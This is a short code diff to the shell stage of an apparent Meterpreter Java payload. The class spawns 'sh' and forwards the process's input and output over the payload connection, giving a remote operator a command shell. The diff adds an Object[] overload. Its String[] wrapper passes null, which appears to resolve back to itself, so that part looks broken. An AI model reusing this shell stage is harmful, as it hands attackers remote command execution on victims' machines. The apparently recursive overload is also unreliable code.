@@ -10,9 +10,14 @@ import javapayload.stage.StreamForwarder;
 /**
  * Meterpreter Java Payload Proxy
  */
-public class Shell implements Stage {
+public class Shell {
 
+    // This is for backwards compatiblity with older (pre #136) payloads
     public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+        start(in, out, null);
+    }
+
+    public void start(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
         final Process proc = Runtime.getRuntime().exec("sh");
         new StreamForwarder(in, proc.getOutputStream(), out).start();
         new StreamForwarder(proc.getInputStream(), out, out).start();
